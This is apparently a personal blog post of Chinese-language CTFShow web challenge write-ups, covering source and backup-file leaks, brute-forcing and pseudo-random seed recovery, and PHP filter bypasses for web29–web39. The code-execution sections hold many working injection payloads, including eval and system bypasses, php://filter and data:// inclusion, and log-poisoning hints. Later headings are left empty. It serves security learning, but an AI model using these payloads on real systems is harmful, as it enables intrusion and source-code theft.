---
title: CTFShow
tags:
  - CTF
abbrlink: 37131
date: 2022-09-29 02:49:51
---

CTFShow



# 信息收集

## web1

开发注释未及时删除 

直接查看源码，flag在注释里



## web2

js前台拦截 === 无效操作

浏览器禁用js或则Burp抓包



## web3

f12 网络在响应头里就有flag或者直接抓包



## web4

robots.txt文件泄露

直接查看robots.txt

robots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。

常见的备份文件

```
.index.php.swp
index.php.swp
index.php.bak
.index.php~
index.php.bak_Edietplus
index.php.~
index.php.1
index.php
index.php~
index.php.rar
index.php.zip
index.php.7z
index.php.tar.gz
www.zip
www.rar
www.zip
www.7z
www.tar.gz
www.tar
web.zip
web.rar
web.zip
web.7z
web.tar.gz
web.tar
wwwroot.rar
web.rar
```



## web5

phps文件泄露

phps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取

```
php备份文件：后缀为php~或者index.php.bak

php的源代码文件：后缀为phps
```



## web6

源码压缩包泄露

直接访问www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问



## web7

版本控制泄露源码

```
git / svn
```

是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。

访问 url/.git/ ，得到 flag 。

.git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害

类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。


## web8

.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）

访问 url/.svn/ ，得到 flag 。

Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。




## web9

vim临时文件泄露

如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件
同时多次意外退出并**不会覆盖旧的.swp文件**，而是会生成一个新的，例如**.swo**文件。

vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn

直接访问index.php.swp

```
一、vim备份文件

     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；

    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~

二、vim临时文件

    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件

 .submit.swp。如果文件正常退出，则此文件自动删除。
```



## web10

cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。



## web11

域名txt记录泄露

域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag

```
https://whois.chinaz.com/
http://www.jsons.cn/nslookup/
https://zijian.aliyun.com/
```



## web12

敏感信息公布

url/admin/访问后台需要登陆

猜测用户名为admin，密码为页面最下方联系电话号码，登录成功



## web13

内部技术文档泄露

在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag



## web14

编辑器配置不当

进入url/editor/

插入文件->文件空间

随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt

直接访问url+/nothinghere/fl000g.txt进入得到flag



## web15

密码逻辑脆弱

进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag



## web16

探针泄露

```
考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag
```

访问/tz.php

再点击进入phpinfo可以得到flag



## web17

备份SQL文件泄露

backup.sql



## web18

js敏感信息泄露

直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag



## web19

前端密钥泄露

直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag



## web20

mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}



## web21

CDN穿透

确定 IP 的话，直接 **ping 域名**，得到 IP

![image-20220927230417655](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220927230417655.png)



# 爆破

## web21

[tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com)](https://www.cnblogs.com/007NBqaq/p/13220297.html)

抓包发现，随便输入的密码被base64编码，解码username:password

对密码进行爆破，猜测用户名为admin:

![image-20220927234912376](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220927234912376.png)

爆破时要进行base64加密以及关掉默认的url编码

![image-20220927235837340](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220927235837340.png)

最后密码为shark63，获取flag



## web22

子域名爆破

使用域名挖掘机



## web23

```
substr(string,start,length)
```

![image-20220928203659084](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928203659084.png)

打开就是一段代码，手动写一段脚本爆破

```
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <?php    
    for ($i = 0; $i < 1000; $i = $i + 1) {
        $token = md5($i);
        if (substr($token, 1, 1) === substr($token, 14, 1) && substr($token, 14, 1) === substr($token, 17, 1)) {
            if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {
                echo $i;
            }
        }
    }
    ?>
</body>

</html>
```



## web24

mt_srand伪随机数

mt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码

mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的

![image-20220928204151045](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928204151045.png)

```
<?php
        mt_srand(372619038);    
        echo intval(mt_rand());
?>
```



## web25

mtrand()随机数生成漏洞

```
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8)));
    $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值
    if((!$rand)){
        if($_COOKIE['token']==(mt_rand()+mt_rand())){
            echo $flag;
        }
    }else{
        echo $rand;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
```

![image-20220928213416452](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928213416452.png)

使用[php_mt_seed - MT_RAND（）种子饼干 (openwall.com)](https://www.openwall.com/php_mt_seed/)爆破出种子

![image-20220928213505637](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928213505637.png)

最后可以得到，这三个mt_rand()的值都不一样

```
<?php
        mt_srand(2414568491);    
        echo mt_rand()."\n";
        echo mt_rand()+mt_rand();

  ?>
```

然后通过burp发包获取flag

![image-20220928213555669](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928213555669.png)



## web26

抓包后直接发包得到flag

![image-20220928214037577](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928214037577.png)



## web27

爆破生日日期

可以获取录取名单，得到姓名和缺少出生日期的身份证号码

![image-20220928215007830](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928215007830.png)

在查询页面发包

![image-20220928215202881](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928215202881.png)

抓取后进行爆破

![image-20220928215240537](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928215240537.png)

![image-20220928215615461](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928215615461.png)

最后得到正确的日期

![image-20220928215722154](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928215722154.png)

登录获取flag



## web28

提示爆破目录

通过暴力破解目录/0-100/0-100/看返回数据包

爆破的时候去掉2.txt 仅仅爆破目录即可

![image-20220928220633875](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928220633875.png)

![image-20220928220626441](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928220626441.png)

![image-20220928225002149](D:\BLOGER\Hexo\source\_posts\CTFShow.assets\image-20220928225002149.png)

# 命令执行

## web29

```
preg_match 执行一个正则表达式匹配
```

```
<?php
//模式分隔符后的"i"标记这是一个大小写不敏感的搜索
if (preg_match("/php/i", "PHP is the web scripting language of choice.")) {
    echo "查找到匹配的字符串 php。";
} else {
    echo "未发现匹配的字符串 php。";
}
?>
```



```
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```
首先执行ls命令，利用system
?c=system(ls);
得到两个文件 flag.php和index.php
用cat命令读取flag.php，因为过滤了flag所以使用通配符
?c=system('cat fla*.php');
?c=system("nl fla?????");
?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;
?c=echo `nl fl\ag.php`;//转义字符绕过
?c=include($_GET[1]);&1=php://filter/read=convert.base64-encode/resource=flag.php
?c=eval($_GET[1]);&1=system('nl flag.php');
?c=awk '{printf $0}' flag.php||
?c=$a="fla";$b="g.php";echo%20file_get_contents($a.$b);
```



```
linux文件内容查看命令
cat、tac、nl、more、less、head、tail、``
```



```
通配符
*可以通配多个字符
?可以通配一个字符
```



## web30

过滤了flag、system、php

```
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



可以使用其他函数

```
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号 同shell_exec()
```



```
c=echo exec('nl fla?????');
c=echo `nl fla''g.p''hp`;
c=echo `nl fla?????`;
```



## web31

```
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



```
c=eval($_GET[1]);&1=system('nl flag.php');//只过滤了c，1可以继续使用空格
c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
c=show_source(next(array_reverse(scandir(pos(localeconv())))));
c=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种
c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()
c=echo`strings%09f*`;
c=echo`strings\$IFS\$9f*`必须加转义字符
```



```
show_source(next(array_reverse(scandir(pos(localeconv())))));

scandir('.')这个函数的作用是扫描当前目录
localeconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.
pos()/current()函数返回数组第一个值
array_reverse()是将数组颠倒
next()将数组指针一项下一位
show_source()的意思是读取函数内容
```



## web32

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



```
c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-
encode/resource=flag.php
//include可以不用括号，后面直接跟变量不用空格，分号可以用?>代替
//利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。
```



```
data伪协议
把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本
c=include$_GET[1]?>&1=data://text/plain,<?php system("cat flag.php");?>
c=include$_GET[1]?>&1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```



## web33

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



```
c=include$_GET[1]?>&1=php://filter/read=convert.base64-
encode/resource=flag.php

c=include$_GET[1]?>&1=data://text/plain,<?php system("cat flag.php");?>
```



## web34

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



## web35

同上

## web36

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



```
c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

c=include$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
```



## web37

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```



```
/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //<?php system('cat flag.php');?>

/?c=data://text/plain,<?php system('cat fla*');?>

还可以配合UA头执行日志包含
c=/var/log/nginx/access.log
```



## web38

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```



```
/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

也可以日志包含
c=/var/log/nginx/access.log
```



## web39

data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```



```
/?c=data://text/plain,<?php system('cat fla*');?>
??为什么base64不行
```



## web40

```
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```



```

```



## web41









## web42

## web43

## web44

## web45

## web46

## web47

## web48

## web49

## web50

## web51

## web52

## web53

## web54

## web55

## web56

## web57

## web58

## web59

## web60

